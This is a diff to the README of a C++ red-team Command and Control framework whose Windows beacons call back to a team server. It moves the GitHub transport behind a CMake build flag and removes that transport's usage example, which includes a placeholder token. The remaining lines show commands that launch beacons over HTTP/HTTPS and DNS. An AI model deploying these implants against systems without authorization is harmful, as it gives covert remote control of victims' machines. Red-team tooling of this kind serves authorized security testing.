@@ -4,7 +4,7 @@
 
 **Exploration** is a lightweight, modular Command and Control (C2) framework designed for red team operations. This repository provides the **Beacon** component implemented in C++ for targeting Windows systems. The corresponding TeamServer and Client components are available in the [C2TeamServer](https://github.com/maxDcb/C2TeamServer) repository.
 
-This project includes multiple Beacons capable of communicating with the TeamServer through a variety of channels. Supported communication methods include HTTP/HTTPS, GitHub, DNS, SMB, and TCP.
+This project includes multiple Beacons capable of communicating with the TeamServer through a variety of channels. Default communication methods include HTTP/HTTPS, DNS, SMB, and TCP. The experimental GitHub transport is available only through an explicit build option.
 
 ## Communication Examples
 
@@ -13,10 +13,6 @@ This project includes multiple Beacons capable of communicating with the TeamSer
 BeaconHttp.exe <TEAMSERVER_IP> <LISTENER_PORT> <http|https>
 BeaconHttp.exe 10.10.10.10 8443 https
 BeaconHttp.exe 10.10.10.10 8080 http
-
-# GitHub
-BeaconGithub.exe <GITHUB_USER/REPO> <ACCESS_TOKEN>
-BeaconGithub.exe maxDcb/C2Implant ghp_dsfgdfhdf5554456g4fdg465...
 
 # DNS
 BeaconDns.exe <DNS_SERVER> <TEAMSERVER_DOMAIN>
@@ -66,6 +62,10 @@ git submodule update --init
 ```
 
 ### Building the Windows Beacons and Modules
+
+The experimental GitHub beacon is excluded by default. Add
+`-DC2_ENABLE_GITHUB_TRANSPORT=ON` during CMake configuration to build
+`BeaconGithub.exe` and `BeaconGithubDll.dll` for dedicated testing.
 
 The supported local configuration is `Release` with the static MSVC runtime (`/MT`). The top-level CMake file configures Conan so `libssh2`, OpenSSL/zlib transitive dependencies, and local targets use the same runtime.
 
